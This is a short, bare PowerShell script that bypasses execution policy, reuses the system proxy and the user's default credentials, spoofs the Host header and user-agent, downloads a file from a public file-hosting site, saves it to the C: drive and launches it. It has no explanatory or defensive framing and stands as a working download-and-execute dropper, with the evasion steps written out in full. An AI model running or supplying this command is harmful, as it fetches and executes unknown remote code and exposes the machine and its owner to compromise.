powershell -exec bypass -c
$u="https://files.catbox.moe/mea71o.apk";
$p=[System.Net.WebRequest]::GetSystemWebProxy();
$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
$w=New-Object net.webclient;
$w.Headers.add('Host','www.hacktree.org')
$w.Headers.add('user-agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;')
$w.proxy=$p;
$w.UseDefaultCredentials=$true;
$s=$w.DownloadFile($u,"C:\mea71o.apk");Start-Process "C:\mea71o.apk";
